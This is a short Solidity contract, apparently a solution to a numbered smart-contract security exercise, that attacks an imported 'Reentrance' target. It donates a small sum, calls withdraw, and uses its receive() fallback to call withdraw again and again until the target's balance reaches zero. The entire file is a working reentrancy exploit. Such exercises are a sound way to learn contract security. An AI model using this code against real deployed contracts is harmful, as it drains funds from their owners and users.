pragma solidity >=0.4.22 <0.9.0;
import './Reentrance.sol';

contract Exo10 {

  Reentrance reentrance;

  constructor(address payable _targetContract) payable{
    reentrance =  Reentrance(_targetContract);
  }

  function execute() public {
    reentrance.donate{value: 1000000000000000, gas: 4000000}(address(this));
    
    reentrance.withdraw{gas: 4000000}(1000000000000000);
    // address(reentrance).call(abi.encodeWithSignature("withdraw(uint)", 100000));
  }

  receive() external payable {
    if (address(reentrance).balance != 0){
      reentrance.withdraw{gas: 4000000}(1000000000000000);
    }
  }
}  
